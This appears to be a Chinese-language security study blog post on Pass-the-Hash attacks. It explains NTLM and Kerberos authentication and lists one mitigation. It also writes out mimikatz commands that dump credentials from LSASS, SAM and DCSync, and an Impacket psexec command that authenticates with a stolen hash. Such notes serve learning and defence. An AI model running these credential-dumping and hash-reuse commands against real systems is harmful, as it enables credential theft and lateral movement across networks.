---
title: "Pass The Hash攻击学习"
description: "Pass The Hash攻击学习，将窃取到的NTLM Hash作为凭据，直接用于认证和访问网络中的其他主机"
date: 2025-08-02
tags:
  - "横向系统"
  - "Windows"
  - "渗透学习"
  - "应急响应"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "passthehash"          # 随机URL字符串
---
<meta name="referrer" content="no-referrer">



## Pass The Hash攻击学习

**简化的NTLM认证流程：**

> 英文翻译结果，这个例子比较好理解

1. **客户端 -> 服务器:** “嗨，我想访问你的资源。”
2. **服务器 -> 客户端:** “哦？那你证明一下你是谁。这是一个随机字符串（Challenge），你用你的密码加密它再发给我。”
3. **客户端:** 客户端会使用用户的**NTLM Hash**（而不是明文密码）来加密这个Challenge，生成一个“响应”（Response）。
4. **客户端 -> 服务器:** “这是加密后的Response。”
5. **服务器:** 服务器将Response交给域控制器（DC）。DC拥有所有用户的NTLM Hash，它会用存储的Hash执行相同的加密计算。如果计算结果与客户端发来的Response一致，就证明客户端拥有正确的凭据，认证通过





### 常见提取

从流程中我们可以发现整个认证过程依赖的是**NTLM Hash**，而不是明文密码  

**NTLM Hash存放一般以下两个位置**

+ **SAM文件:** 对于本地账户，Hash存储在 `C:\Windows\System32\config\SAM` 文件中。这个文件在系统运行时是锁定的。

```bash
# mimikatz 
lsadump::sam
```

+ **LSASS进程内存:** 当用户登录系统后（无论是本地登录、远程桌面还是运行服务），为了方便后续的认证，系统会将该用户的凭据（包括NTLM Hash）缓存在一个名为`lsass.exe`（Local Security Authority Subsystem Service）的进程内存中。**这是PtH攻击最主要的Hash来源。**

```bash
#mimikatz 
privilege::debug sekurlsa::logonpasswords
```

+  **DCSync**

 模拟域控制器的复制请求，从 DC 拉取用户 Hash。  

```bash
mimikatz 
lsadump::dcsync /user:DOMAIN\Administrator
```



### 一般攻流程

所以一般来讲，一个典型的域环境 PTH 攻击流程：

1. **拿到域内主机**（可以低权限）。
2. **提取 LSASS 或 SAM 中的 Hash**。
3. **使用 PTH 工具发起会话**：
   - Windows 自带：

```plain
runas /netonly /user:DOMAIN\Administrator cmd
```

    - Impacket：

```plain
python3 psexec.py DOMAIN/Administrator@TARGET -hashes <LMhash>:<NThash>
```

4. 继续移动。





### 防御措施

+ 禁用 NTLM 或限制 NTLM 使用（用 Kerberos 代替）。
+ 启用 **LSASS 保护（RunAsPPL）**：

```plain
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
```

...





## NTLM 和 Kerberos 

> GPT-5 总结一下

### NTLM（ NT LAN Manager  ）

#### 核心特点

+ **基于质询-响应（Challenge-Response）** 协议。
+ 不会直接传输明文密码，而是用 **NTLM Hash** 来参与加密运算。
+ 主要用在：
  - 无法使用 Kerberos 的场景（比如非域环境、跨域、与旧系统交互）
  - 一些遗留应用和协议（SMBv1/2、RPC、RDP 等）

#### 简化认证流程

1. 客户端发起请求。
2. 服务器发送一个随机 **Challenge**（8 字节）。
3. 客户端用 **NTLM Hash + Challenge** 计算出 Response。
4. 服务器把 Response 交给域控制器（或本地 SAM 数据库）验证。

> **弱点**
>
> + **Hash 即凭据** → 拿到 Hash 就能认证（PTH 攻击核心）。
> + 无法抵抗重放攻击（除非 Challenge 是一次性且短时有效）。
> + 没有强加密的会话票据，安全性低于 Kerberos。



###  Kerberos  

>  Kerberos是一种广泛使用的**网络认证协议**，它主要用于在不安全的网络环境中，为客户端和服务器提供安全的身份验证。它的核心思想是使用一个可信任的第三方来验证通信双方的身份。  

#### 核心特点

+ 基于票据（Ticket-based） 的认证协议。
+ 使用对称加密（AES、RC4 等）和时间戳来防止重放攻击。
+ 默认在 Windows 域环境使用，NTLM 是备选方案。
+ 设计目标是 单点登录（SSO），登录一次即可访问域内多台机器。

#### 参与角色

+ 客户端（User/Machine）
+ 服务（Server）
+ KDC（Key Distribution Center） → 通常在域控制器上，包含：
  - AS（Authentication Service）：初始认证
  - TGS（Ticket Granting Service）：发放服务票据

#### 简化认证流程

1. 初始认证（AS 交换）
   - 客户端向 KDC 请求 TGT（Ticket Granting Ticket）。
   - KDC 用用户密码的哈希加密 TGT → 客户端解密成功即证明身份。
2. 请求服务票据（TGS 交换）
   - 客户端用 TGT 向 KDC 请求某个服务的 Ticket。
   - KDC 生成服务票据，用服务的密钥加密。
3. 访问服务（AP 交换）
   - 客户端把服务票据交给目标服务 → 服务解密验证 → 建立会话。

> **优点**
>
> + 不依赖 Hash 直接登录（Hash 不会像 NTLM 那样直接参与 Challenge）。
> + 有效防止重放攻击（票据有时间戳和生命周期）。
> + 支持双向认证（客户端和服务端互相验证）。
>
> **弱点**
>
> + 如果拿到 **TGT 或 TGS 票据**，依然可以伪造会话（**Pass-the-Ticket 攻击**）。
> + KDC/域控制器被攻陷 → 全域沦陷（黄金票据/白银票据攻击）。







## Impacke 套件

>  Impacket 是一个内网渗透的“命令行航母”，它将复杂的Windows网络协议攻击封装成了简单易用的脚本  

简单的说， Impacket是一个用Python编写的、用于处理网络协议的类库集合  

[GitHub - fortra/impacket: Impacket is a collection of Python classes for working with network protocols.](https://github.com/fortra/impacket)




## mimikatz 猕猴桃

### 常用操作

**提升权限**

```plain
privilege::debug
```

**导出系统凭据:**

```plain
sekurlsa::logonpasswords
```

**导出SAM数据库:**

```plain
lsadump::sam
```

**导出缓存的域凭据:**

```plain
lsadump::cache
```

**Kerberos票据操作:**

```plain
sekurlsa::tickets
kerberos::list
```

**导出NTDS.dit (域控制器):**

```plain
lsadump::dcsync /user:Administrator
```



## 参考文章

[Pass The hash攻击 - kalixcn - 博客园](https://www.cnblogs.com/kalixcn/p/18138330)

[What is a Pass-the-Hash Attack? | CrowdStrike](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/)

